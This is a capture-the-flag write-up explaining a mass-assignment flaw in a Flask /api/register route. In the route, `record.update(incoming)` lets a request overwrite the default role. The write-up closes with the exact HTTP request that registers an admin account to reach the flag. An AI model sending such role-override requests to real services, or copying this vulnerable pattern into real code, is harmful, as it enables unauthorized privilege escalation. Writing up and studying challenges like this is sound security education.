#### A Massive Problem
- points earned: 581
#### Where's the flag?
- The flag is loaded into the container as an environment variable.
- It is referenced by the `/admin` route where it is used in the `admin.html` template.
- Only an admin  user can access this route so I know I'll need to do one of the following:
	- create an admin user
	- gain access to the admin account
	- escalate privileges of an non-admin user
#### Investigating the `/api/register` route
```python
@app.route('/api/register', methods=['POST'])
def register():
    incoming = request.get_json(silent=True) or request.form.to_dict()
    username = incoming.get('username', '').strip()
    password = incoming.get('password', '')
    full_name = incoming.get('full_name', '').strip()
    title = incoming.get('title', '').strip()
    team = incoming.get('team', '').strip()
    if not username or not password or not full_name or not title or not team:
        return jsonify({'error': 'Please complete all required fields.'}), 400
    if not valid_password(password):
        return jsonify({'error': 'Password does not meet policy.'}), 400
    record = {
        'username': username,
        'password': password,
        'role': 'standard',
        'full_name': full_name,
        'title': title,
        'team': team
    }
    record.update(incoming)
    if not record.get('username') or not record.get('password') or not record.get('role'):
        return jsonify({'error': 'Unable to create account.'}), 400
    conn = get_db()
    conn.execute(
        'insert into users (username, password, role, full_name, title, team) values (?, ?, ?, ?, ?, ?) '
        'on conflict(username) do update set password=excluded.password, role=excluded.role, full_name=excluded.full_name, title=excluded.title, team=excluded.team',
        (record['username'], record['password'], record['role'], record['full_name'], record['title'], record['team'])
    )
    conn.commit()
    conn.close()
    session['auth_notice'] = {
        'title': 'Account created',
        'message': 'Your workspace account is ready. Sign in to continue.'
    }
    return jsonify({'redirect': url_for('login_page')})
```
- This is the route a user needs to access in order to register a new account.
- A rough overview of the logic is
	- create a `incoming` dict and assign the POST data to it
	- get `username`, `password`, `full_name`, `title`, and `team` from `incoming`
	- assert that all values were provided and do some validation on `password`
	- create a `record` dict for the new account, making sure to set `role` as `standard`
	- update the `record` dict with keys/values from `incoming` 🤔
	- assert that the `record`dict has `username`, `password`, and `role` values
	- store the new account in the db
	- return a redirect to `/login`
- The problem with this logic is that `record.update(incoming)` provides an opportunity to overwrite or create new entries in the `record` dict.
- This allows an attacker to send a specially crafted registration request that sets the `role` to `admin`

#### Solution
- Send the below request
```http
POST /api/register HTTP/1.1
Host: 23.179.17.92:5556

{"full_name":"meow","username":"meow","title":"meow","team":"meow","role":"admin","password":"aaaaaaaaA1!"}
```